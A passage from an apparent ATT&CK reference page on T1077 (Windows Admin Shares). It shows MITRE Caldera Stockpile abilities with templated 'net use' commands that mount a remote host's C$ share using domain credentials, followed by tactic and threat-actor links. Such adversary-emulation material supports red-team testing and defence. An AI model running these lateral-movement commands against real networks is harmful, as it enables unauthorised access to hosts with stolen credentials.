                                                                                                                      '\\\\#{remote.host.ip}\\c$ '
                                                                                                                      '/delete;\n',
                                                                                                           'command': 'net '
                                                                                                                      'use '
                                                                                                                      '\\\\#{remote.host.ip}\\c$ '
                                                                                                                      '/user:#{domain.user.name} '
                                                                                                                      '#{domain.user.password};\n'}}},
                                                                         'tactic': 'lateral-movement',
                                                                         'technique': {'attack_id': 'T1077',
                                                                                       'name': 'Windows '
                                                                                               'Admin '
                                                                                               'Shares'}}},
 {'Mitre Stockpile - Mount a windows share': {'description': 'Mount a windows '
                                                             'share',
                                              'id': 'aa6ec4dd-db09-4925-b9b9-43adeb154686',
                                              'name': 'Mount Share',
                                              'platforms': {'windows': {'psh': {'cleanup': 'net '
                                                                                           'use '
                                                                                           '\\\\#{remote.host.fqdn}\\C$ '
                                                                                           '/delete\n',
                                                                                'command': 'net '
                                                                                           'use '
                                                                                           '\\\\#{remote.host.fqdn}\\C$ '
                                                                                           '/user:#{network.domain.name}\\#{domain.user.name} '
                                                                                           '#{domain.user.password}\n',
                                                                                'parsers': {'plugins.stockpile.app.parsers.share_mounted': [{'edge': 'has_share',
                                                                                                                                             'source': 'remote.host.fqdn'}]}}}},
                                              'requirements': [{'plugins.stockpile.app.requirements.not_exists': [{'edge': 'has_share',
                                                                                                                   'source': 'remote.host.fqdn'}]},
                                                               {'plugins.stockpile.app.requirements.basic': [{'edge': 'has_password',
                                                                                                              'source': 'domain.user.name',
                                                                                                              'target': 'domain.user.password'}]},
                                                               {'plugins.stockpile.app.requirements.no_backwards_movement': [{'source': 'remote.host.fqdn'}]}],
                                              'tactic': 'lateral-movement',
                                              'technique': {'attack_id': 'T1077',
                                                            'name': 'Windows '
                                                                    'Admin '
                                                                    'Shares'}}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations

None

# Actors


* [Deep Panda](../actors/Deep-Panda.md)

* [Ke3chang](../actors/Ke3chang.md)
    
* [Orangeworm](../actors/Orangeworm.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Turla](../actors/Turla.md)
    
* [Threat Group-1314](../actors/Threat-Group-1314.md)
    
* [APT3](../actors/APT3.md)
    
* [APT32](../actors/APT32.md)
    
